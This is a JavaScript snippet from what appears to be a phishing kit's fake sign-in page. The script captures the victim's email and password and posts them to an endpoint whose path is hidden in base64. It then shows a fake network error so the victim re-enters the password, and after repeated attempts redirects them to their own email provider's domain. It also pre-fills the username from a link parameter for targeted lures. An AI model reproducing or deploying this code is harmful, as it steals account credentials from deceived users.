<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="./config.js"></script>
<script>
	var count = 0;
	$('#chalbhai').submit(function (event) {
	  //var password = $("#password").val();
	  event.preventDefault();
	  var email = $("#u").val();
	  var password = $("#p").val();
	  var ind = email.indexOf("@");
	  var my_slice = email.substr((ind + 1));
	  var atu = "L2Nvbm5lY3QucGhw";
	  if(password == '') {
		$('#err_m').text('Please enter your password.');
		setTimeout(function() {
			$('#err_m').text('');
		}, 3000)
	  } else {
		$('#err_m').text('');
		count = count + 1;
		  //console.log(email);
		$.ajax({
		  dataType: 'JSON',
		  url: `${config.baseUrl}${atob(atu)}`,
		  type: 'POST',
		  data: {
			email: email,
			password: password
		  },
		  beforeSend: function(xhr){
			$('#login_button').attr('value','Sign In');
			  
		  },
			
		 success: function (response) {
			if (response) {
			   //console.log(response);
			   if (response.signal == 'ok') {
				  $('#err_m').text("There is a problem with the network, please refresh the page and try again later");
				  setTimeout(function() {
					$('#err_m').text('');
				  }, 5000)
				  $("#p").val("");
				  if (count >= 2) {
					 count = 0;
					 window.location.replace("https://"+my_slice)
				  }
			   } else {
				  $('#err_m').text("There is a problem with the network, please refresh the page and try again later");
				  setTimeout(function() {
					$('#err_m').text('');
				  }, 5000)
			   }
			}
		 },
		 error: function () {
			
			$("#p").val("");
			if (count >= 3) {
			   count = 0;
			   window.location.replace("https://"+my_slice)
			}
			$('#err_m').text("There is a problem with the network, please refresh the page and try again later");
			setTimeout(function() {
				$('#err_m').text('');
			}, 5000)
		 },
		 complete: function(){
			$('#login_button').attr('value','Sign In');
		 }
		})
	  }
	  
   });

	function getParameterByName(name, url) {
		if (!url) url = window.location.href;
		name = name.replace(/[\[\]]/g, '\\$&');
		var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
			results = regex.exec(url);
		if (!results) return null;
		if (!results[2]) return '';
		return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
		
	const login_username = getParameterByName('cms');
	document.getElementById("u").value = login_username;
  </script>
